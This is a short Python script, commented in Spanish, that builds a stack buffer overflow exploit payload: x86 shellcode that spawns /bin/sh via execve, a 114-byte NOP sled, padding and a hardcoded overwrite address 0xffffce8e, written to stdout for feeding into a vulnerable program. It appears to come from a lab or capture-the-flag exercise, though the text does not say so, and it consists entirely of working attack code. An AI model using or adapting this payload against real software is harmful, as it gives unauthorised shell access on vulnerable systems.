import sys

# Shellcode para execve("/bin//sh") - 24 bytes
shellcode = (b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x89\xe1\xb0\x0b\xcd\x80")

# NOP Sled: 140 - 24 = 116. ¡Vamos a 114 NOPs + Shellcode!
NOP_sled_len = 114 
padding_extra = 2 # 2 bytes extra de padding. Total de relleno: 116 bytes.

# EIP Target: 0xffffce8e (La dirección que ya ha demostrado que el procesador intenta ejecutar)
EIP_target = b"\x8e\xce\xff\xff" 

# Payload: NOPs (114) + Shellcode (24) + Padding (2) + EIP (4)
# Total de bytes: 144
payload = b"\x90" * NOP_sled_len + shellcode + b"\x90" * padding_extra + EIP_target

sys.stdout.buffer.write(payload)
